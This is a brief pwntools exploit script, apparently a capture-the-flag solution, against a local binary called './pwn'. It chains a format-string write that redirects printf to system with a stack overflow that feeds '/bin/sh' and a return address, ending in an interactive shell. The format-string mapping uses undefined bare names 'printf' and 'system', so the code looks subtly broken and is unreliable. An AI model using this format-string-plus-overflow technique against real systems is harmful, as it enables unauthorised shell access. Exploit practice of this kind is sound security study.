from pwn import *

context(os='linux', arch='amd64', kernel='amd64',log_level='debug')



io=gdb.debug('./pwn','''
            break main
            break vuln
            break *0x4007c8
             ''')


#io=process('./pwn')

elf=ELF('./pwn')
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil




ru(b'name:')

payload1=b'%16$p'
#payload1=b'%16$paaa'
payload1+=fmtstr_payload(7,{printf:system},numbwritten=14,write_size='short')
#payload1+=b'%102c%16$n'

#payload1+=b'%16$paaa'
sl(payload1)
#ru(b'0x')
#rbp= int(io.recv(12).rjust(16,b'0'),16)
#rbp = int(io.recv(16), 16)
ru(b'!')


sl(b'/bin/sh\x00'+b'a'*(0x60-len(b'/bin/sh\x00')-8)+p64(0x4007BC))
io.interactive()




